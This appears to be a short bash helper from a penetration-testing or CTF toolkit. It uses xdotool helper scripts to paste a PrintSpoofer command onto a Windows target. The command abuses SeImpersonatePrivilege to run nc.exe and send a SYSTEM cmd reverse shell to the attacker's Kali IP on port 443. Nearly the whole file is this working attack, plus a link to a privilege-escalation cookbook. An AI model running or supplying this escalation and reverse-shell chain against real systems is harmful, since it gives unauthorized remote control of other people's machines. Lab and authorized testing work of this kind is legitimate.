#!/bin/bash

"""
PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
"""

; '
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "c:\Temp\PrintSpoofer64.exe -c \"c:\Temp\nc.exe ${KALI_IP} 443 -e cmd\""
